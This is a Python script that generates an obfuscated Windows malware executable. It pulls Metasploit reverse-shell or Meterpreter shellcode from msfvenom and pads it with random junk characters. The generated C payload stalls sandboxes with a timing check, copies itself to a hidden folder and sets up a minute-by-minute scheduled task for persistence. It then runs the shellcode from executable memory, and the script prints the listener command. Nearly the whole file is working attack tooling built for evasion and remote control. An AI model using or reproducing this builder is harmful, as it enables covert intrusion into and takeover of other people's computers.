import random
import subprocess
import sys
import os

def CheckInternet():
	import socket

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(('8.8.8.8', 0))
		IP = s.getsockname()[0]
		return IP
	except:
		return "0.0.0.0"


def randomize (plain, junk):
	charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
	out = []
	for i in plain:
		for j in range(junk):
			out.append (random.choice(charset))
		out.append (i)

	return "".join(out)


def cvar (text, size):
	out = ""
	w = [text[i:i+size] for i in range(0, len(text), size)]

	for i in range(0, len(w)):
		out += "\n\t\"" + w[i] + "\""
	out += ";"

	return out


def clean_up():
	try: os.remove (SHELLCODE_OUT_FILE)
	except: pass
	try: os.remove (MAKEFILE_OUT_FILE)
	except: pass
	try: os.remove (PAYLOAD_OUT_FILE)
	except: pass
	try: os.remove ("icon.rc")
	except: pass
	try: os.remove ("icon.o")
	except: pass
	


def _template (shellcode, sc_len, junk, PATH, AGENT, RUNNER, CMD_PERSISTENCE, CMD_HIDE_1, CMD_HIDE_2):
	return '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>

void waste_time (int s);
int copy_file(char *old_filename, char  *new_filename);
void persistence ();
void derandomize (const char *in_buf, char *out_buf, int junk);
int run ();
int sys_bineval(char *argv, size_t len);

void waste_time (int s){
	int ok = 0;
	while (ok < 5){
		int a = GetTickCount();
		Sleep(1000);

		int arr [64] = {};

		for (int i=0; i<64; i++){
			arr [i] = i+1;
			for (int j=0; j<64; j++){
				arr [j] += i-j;
			}
		}

		int b = GetTickCount();

		for (int i=0; i<64; i++){
			arr [i] = i+1;
			for (int j=0; j<64; j++){
				arr [j] += i-j;
			}
		}


		if ((b - a) > 900) {
			ok += 1;
		}

	}

	for (int i=0; i < s; i++){
		int arr [64] = {};

		for (int i=0; i<64; i++){
			arr [i] = i+1;
			for (int j=0; j<64; j++){
				arr [j] += i-j;
			}
		}

		Sleep(1000);
	}
}

int copy_file(char *old_filename, char  *new_filename) {
	FILE  *ptr_old, *ptr_new;
	errno_t err = 0, err1 = 0;
	int  a;

	err = fopen_s(&ptr_old, old_filename, "rb");
	err1 = fopen_s(&ptr_new, new_filename, "wb");

	if(err != 0)
		return  -1;

	if(err1 != 0) {
		fclose(ptr_old);
		return  -1;
	}

	while(1) {
		a  =  fgetc(ptr_old);

		if(!feof(ptr_old))
			fputc(a, ptr_new);
		else
			break;
	}

	fclose(ptr_new);
	fclose(ptr_old);
	return  0;
}


void persistence (char *current_exe){
	char path_runner [] = "''' + str(PATH) + str(RUNNER) + '''";
	char path_agent [] = "''' + str(PATH) + str(AGENT) + '''";
	//char path [] = "''' + str(PATH) + '''";
	//char agent [] = "''' + str(AGENT) + '''";
	//char runner [] = "''' + str(RUNNER) + '''";

	FILE * f1;
	f1 = fopen(path_agent, "r");
	if (f1){
		fclose(f1);
	}else{
		system("mkdir \\"''' + str(PATH) +'''\\"");
		copy_file (current_exe, path_agent);

		FILE *f2 = fopen(path_runner, "w");
		if (f2 != NULL) {
			fprintf(f2, "Set oShell = CreateObject (\\\"Wscript.Shell\\\")\\n");
			fprintf(f2, "Dim strArgs\\n");
			fprintf(f2, "strArgs = \\\"''' + str(PATH) + str(AGENT) + '''\\\"\\n");
			fprintf(f2, "oShell.Run strArgs, 0, false\\n");
		}
		fclose(f2);

		system("''' + str(CMD_PERSISTENCE) +'''");
		system("''' + str(CMD_HIDE_1) +'''");
		system("''' + str(CMD_HIDE_2) +'''");
	}
	
}


void derandomize (const char *in_buf, char *out_buf, int junk){
	
	int len = (size_t)strlen(in_buf);
	int pos = 0;
	int counter = 0;
	for (int i=0; i<len; i++){
		counter += 1;
		if ( (counter % (junk + 1)) == 0 ){

			/*__asm (
				PUSH EAX
				XOR EAX, EAX
				JZ True1
				__asm __emit(0xca)
				__asm __emit(0x55)
				__asm __emit(0x78)
				__asm __emit(0x2c)
				__asm __emit(0x02)
				__asm __emit(0x9b)
				__asm __emit(0x6e)
				__asm __emit(0xe9)
				__asm __emit(0x3d)
				__asm __emit(0x6f)
				True1:
				POP EAX
			);*/

			out_buf[pos] = in_buf[i];
			pos += 1;

			/*__asm (
				PUSH EAX
				XOR EAX, EAX
				JZ True2
				__asm __emit(0xca)
				__asm __emit(0x55)
				__asm __emit(0x78)
				__asm __emit(0x2c)
				__asm __emit(0x02)
				__asm __emit(0x9b)
				__asm __emit(0x6e)
				__asm __emit(0xe9)
				__asm __emit(0x3d)
				__asm __emit(0x6f)
				True2:
				POP EAX
			);*/

		}
	}
}



int main(int argc, char *argv[]){
	
	persistence (argv[0]);
	waste_time (60);
	run ();
	exit(0);
}


int run (){

	char out_buff [''' + str(sc_len) + '''] = {};
	int junk = ''' + str(junk) + ''';
	char buff [] = ''' + str(shellcode) + '''
	
	derandomize (buff, out_buff, junk);

	size_t len;
	len = (size_t)strlen(out_buff);
	sys_bineval(out_buff, len);

	exit(0);
}

int sys_bineval(char *buf, size_t len)
{

	char *argv=buf;
	char *tempbuf=NULL;
	char *winmem;

	winmem = (char *) VirtualAlloc(NULL, len+1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(winmem, argv, len+1);

	if (tempbuf!=NULL) {
		free(tempbuf);
	}

	__asm__ (
		"mov %0, %%eax\\n"
		"call *%%eax\\n"
		: // no output
		: "m"(winmem) // input
	);

	return 0;
}

'''

SHELLCODE_OUT_FILE = "shellcode.txt"
MAKEFILE_OUT_FILE = "Makefile"
PAYLOAD_OUT_FILE = "payload.c"
EXECUTABLE_OUT_FILE = "payload.exe"

######################################################################
# Defaults

PATH = "C:\\Users\\Public\\Agent\\"
AGENT = "Agent.exe"
RUNNER = "Agent.vbs"
TASK_DELAY = "1"						
TASK_NAME = "Agent"						

######################################################################

CMD_PERSISTENCE = "schtasks /create /sc minute /mo " + TASK_DELAY + " /tn " + TASK_NAME + " /tr " + PATH + RUNNER + " /F"
CMD_HIDE_1 = "attrib +S +H +I /S /D " + PATH + "* "
CMD_HIDE_2 = "attrib +S +H +I /S /D " + PATH[:-1]

######################################################################

make_file = '''CC ?= gcc\nSTRIP ?= strip\n# STRIPFLAGS += -sx\nCFLAGS += -Wall -Os 
# CFLAGS += -DDEBUG=1\n# CFLAGS += -static\nCFLAGS64 += -fPIC\nOUT ?= payload
\n32:\n\t$(CC) payload.c -o $(OUT) $(CFLAGS)\n\t$(STRIP) $(STRIPFLAGS) $(OUT)
\n64:\n\t$(CC) payload.c $(CFLAGS64) -o $(OUT) $(CFLAGS)\n\t$(STRIP) $(STRIPFLAGS) $(OUT)
'''

make_file_icon = '''CC ?= gcc\nSTRIP ?= strip\n# STRIPFLAGS += -sx\nCFLAGS += -Wall -Os 
# CFLAGS += -DDEBUG=1\n# CFLAGS += -static\nCFLAGS64 += -fPIC\nOUT ?= payload
\n32:\n\t$(CC) payload.c icon.o -o $(OUT) $(CFLAGS)\n\t$(STRIP) $(STRIPFLAGS) $(OUT)
\n64:\n\t$(CC) payload.c $(CFLAGS64) -o $(OUT) $(CFLAGS)\n\t$(STRIP) $(STRIPFLAGS) $(OUT)
'''

######################################################################

payload_list = [ 'windows/shell/reverse_tcp', 'windows/meterpreter/bind_tcp', 'windows/meterpreter/reverse_tcp']

JUNK = 4
PAYLOAD = ''
RHOST = ''
LPORT = ''
ICON = ''


print "[*] Available payloads: "
for p in payload_list:
			print "\t" + str(payload_list.index(p)) + ") " + p
print "\n"
while not PAYLOAD:
	try:
		PAYLOAD = payload_list[input ("[?] PAYLOAD: ")]
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


while not RHOST:
	try:
		RHOST = raw_input ('\n[?] RHOST (' + CheckInternet() + '): ')
		if not RHOST: RHOST = CheckInternet()
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


while not LPORT:
	try:
		LPORT = raw_input ("\n[?] LPORT (4444): ")
		if not LPORT: LPORT = "4444"
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


tmp = ""
done = False
while not done:
	try:
		tmp = raw_input ("\n[?] ICON (disabled): ")
		if ( tmp != "" ):
			if os.path.isfile( tmp ):
				ICON = tmp
				done = True
			else:
				print "[!] No valid icon file."
				done = False
		else:
			ICON = None
			done = True
	except:
		pass


print "\n\n[*] Configuration:"
print "    - PAYLOAD: " + PAYLOAD
print "    - RHOST:   " + RHOST
print "    - LPORT:   " + LPORT
if ICON == None: print "    - ICON:    disabled"
else:            print "    - ICON:    " + ICON
print "\n"


try:
	tmp = ""
	while (tmp != "y") and (tmp != "n"):
		tmp = raw_input ("[?] Ready [y/n]? ")

	if tmp == "y":

		clean_up()

		# Generate and write shellcode to file
		f = open(SHELLCODE_OUT_FILE, "w")
		subprocess.call (['msfvenom', '-p', PAYLOAD, '-a', 'x86', '--platform', 
			'windows', '-e', 'x86/alpha_mixed', '-f', 'raw', 'RHOST=' + RHOST, 
			'LPORT=' + LPORT, 'EXITFUNC=thread', 'BufferRegister=EAX'], 
			bufsize=1024, stdout=f)
		f.close()

		# Read from file and obfuscate shellcode
		f = open( SHELLCODE_OUT_FILE , "r")
		buf = f.read()
		f.close()

		obf_shellcode = cvar(randomize(buf, JUNK), 64)

		f = open(PAYLOAD_OUT_FILE, "w")
		f.write(_template(obf_shellcode, len(buf), JUNK, PATH.replace("\\","\\\\"), 
			AGENT.replace("\\","\\\\"), RUNNER.replace("\\","\\\\"), 
			CMD_PERSISTENCE.replace("\\","\\\\"), CMD_HIDE_1.replace("\\","\\\\"), 
			CMD_HIDE_2.replace("\\","\\\\")
			)
		)
		f.close()

		if (ICON == None):
			f = open(MAKEFILE_OUT_FILE, "w")
			f.write(make_file)
			f.close()

		else:
			f = open(MAKEFILE_OUT_FILE, "w")
			f.write(make_file_icon)
			f.close()

			f = open("icon.rc", "w")
			f.write("id ICON \"" + ICON + "\"")
			f.close()

			subprocess.call(['i686-w64-mingw32-windres', "icon.rc", 'icon.o'], 
				bufsize=1024,)


		subprocess.call(['make', 'CC=i686-w64-mingw32-gcc', 'STRIP=i686-w64-mingw32-strip', 
			'OUT=' + EXECUTABLE_OUT_FILE], bufsize=1024,)


		clean_up()

		print "\n\n[*] Run metasploit: "
		print "msfconsole -x \'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT " + LPORT + "; run\'"

	else:
		print "[*] Gracefully quitting..."
		sys.exit(0)
except:
	print "[*] Gracefully quitting..."
	sys.exit(0)

# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/alpha_mixed -f raw LHOST=192.168.1.27 LPORT=4444 EXITFUNC=thread BufferRegister=EAX
# msfconsole -x 'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run'
# make CC=i686-w64-mingw32-gcc STRIP=i686-w64-mingw32-strip OUT=scexec32.exe

# echo "id ICON \"icon.ico\"" > icon.rc
# i686-w64-mingw32-windres icon.rc icon.o
# i686-w64-mingw32-gcc source.c icon.o


